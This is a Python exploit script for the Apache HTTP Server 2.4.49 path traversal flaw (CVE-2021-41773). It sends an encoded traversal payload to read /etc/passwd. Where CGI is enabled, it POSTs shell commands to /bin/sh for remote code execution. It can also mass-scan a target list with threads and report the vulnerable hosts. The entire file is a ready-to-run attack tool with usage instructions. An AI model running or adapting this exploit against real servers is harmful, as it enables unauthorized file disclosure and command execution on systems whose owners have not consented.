import sys
import concurrent.futures
import urllib.request as requests

global vul_target
vul_target = []

def check_vulnerable(target):
    print(f"Try Exploiting {target} ... ... ...")
    payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e'
    req = requests.Request(f'http://{target}{payload}/etc/passwd')
    try:
        response = requests.urlopen(req, timeout=5)
    except requests.HTTPError as e:
        # If cgi is enabled, file will be ran as script. So /etc/passwd will return 500 Internal Error
        # Check RCE 
        if e.code == 500:
            data = bytes('echo Content-Type: text/plain; echo;id'.encode('utf-8'))
            req2 = requests.Request(f'http://{target}{payload}/bin/sh', data= data, method='post')
            response = requests.urlopen(req2, timeout=5)

    response_text = response.read().decode('utf-8')
    # Check response contain root ( in file /etc/passwd) or uid appead if RCE successful
    if 'root' in response_text or 'uid' in response_text:
        vul_target.append(target)
        return response_text
    else:
        return "Target {target} is not vulnerable."
        

# Send request mutiple threading with cocurrent lib
def check_multiple_targets(file):
    with open(file, 'r', encoding= 'utf-8') as f:
        targets = f.read().splitlines()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(check_vulnerable, targets)


def main():
    try:
        if sys.argv[1] == '-h':
            h = '''
    [+] python ./exploit.py [-OPTIONS] [Target/List of Targets]
    [+] -h : help
    [+] -url <target>: specifict the target to check 
    [+] -list <filename>: Scan multiple targets
            '''
            print(h)
        else:
            if sys.argv[1] == '-url':
                try:
                    target = sys.argv[2]  # target url
                    result = check_vulnerable(target)
                    print(result)
                except:
                    print('Something went wrong with the args.')
                    exit()
                
            if sys.argv[1] == '-list':
                try:
                    file = sys.argv[2]  # file to request
                    check_multiple_targets(file)
                except:
                    print('Something went wrong with the args.')
                    exit()
            if len(vul_target) > 0:
                print(f"Found {len(vul_target)} target is Vulnerable")
                for target in vul_target:
                    print("[+] "+target)
            else:
                print("-------------------------------------\n[-]  Not found Vulerable target")
    except:
        print("-------------++Usage++-------------")
        print('''
    [+] python ./exploit.py [-OPTIONS] [Target/List of Targets]
    [+] -h : help
    [+] -url <target>: specifict the target to check 
    [+] -list <filename>: Scan multiple targets''')



    
if __name__ == '__main__':
    print("""----------------------------------------------
[*] Exploit Title: Apache HTTP Server 2.4.49 Path Traversal
[*] CVE: CVE-2021-41773
[*] Author: SonQH2
[*] Version: Apache 2.4.49
----------------------------------------------
""")
    main()